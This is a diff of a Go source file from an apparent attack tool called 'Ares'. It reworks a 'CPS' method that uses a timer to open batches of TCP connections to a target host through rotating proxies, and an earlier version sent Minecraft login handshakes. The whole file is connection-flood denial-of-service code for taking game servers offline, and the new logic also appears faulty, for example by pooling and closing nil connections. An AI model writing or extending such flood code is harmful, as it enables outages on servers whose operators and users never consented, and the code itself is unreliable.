@@ -2,67 +2,70 @@ package methods
 
 import (
 	"Ares/core"
-	"Ares/net/minecraft"
-	"Ares/net/minecraft/packet"
-	"Ares/utils/mcutils"
-	"fmt"
 	"net"
-	"strconv"
 	"time"
 )
 
 type CPS struct {
-	Config          *core.AttackConfig
-	isRunning       bool
-	handshakePacket packet.Packet
+	Config     *core.AttackConfig
+	isRunning  bool
+	connBuffer chan net.Conn
+	connPool   chan net.Conn
+	done       chan struct{}
 }
 
 func (c *CPS) Start() {
-	ip, port, err := net.SplitHostPort(c.Config.Host)
-	if err != nil {
-		fmt.Println(err)
-		return
-	}
-	iport, err := strconv.Atoi(port)
-	if err != nil {
-		fmt.Println(err)
-		return
-	}
-
-	c.handshakePacket = mcutils.GetHandshakePacket(ip, iport, c.Config.Version, mcutils.Login)
-
 	c.isRunning = true
-
-	done := make(chan struct{})
-
-	for i := 0; i < c.Config.Loops; i++ {
-		go c.loop(done)
-	}
+	c.done = make(chan struct{})
+	c.loop()
 }
 
-func (c *CPS) loop(done chan struct{}) {
+func (c *CPS) loop() {
+	c.connBuffer = make(chan net.Conn, c.Config.PerDelay)
+	c.connPool = make(chan net.Conn, c.Config.PerDelay)
+	for i := 0; i < c.Config.PerDelay; i++ {
+		c.connPool <- c.connect()
+	}
 	ticker := time.NewTicker(c.Config.Delay)
 	defer ticker.Stop()
 	for {
 		select {
 		case <-ticker.C:
 			for i := 0; i < c.Config.PerDelay; i++ {
-				go c.connect()
+				go c.handleBatch()
 			}
-		case <-done:
+		case <-c.done:
 			return
 		}
 	}
 }
 
-func (c *CPS) connect() {
-	conn, err := minecraft.DialMc(c.Config.Host, c.Config.ProxyManager.GetNext())
+func (c *CPS) connect() net.Conn {
+	conn, err := c.Config.ProxyManager.GetNext().Dial()(c.Config.Host)
 	if err != nil {
-		return
+		return nil
 	}
-	defer conn.Close()
+	return conn
+}
+
+func (c *CPS) handleBatch() {
+	conn := <-c.connPool
+	c.connBuffer <- conn
+	batch := make([]net.Conn, 0, c.Config.PerDelay)
+	for i := 0; i < c.Config.PerDelay; i++ {
+		conn, ok := <-c.connBuffer
+		if !ok {
+			break
+		}
+		batch = append(batch, conn)
+	}
+	for _, conn := range batch {
+		conn.Close()
+		c.connPool <- c.connect()
+	}
 }
 
 func (c *CPS) Stop() {
 	c.isRunning = false
+	close(c.done)
 }
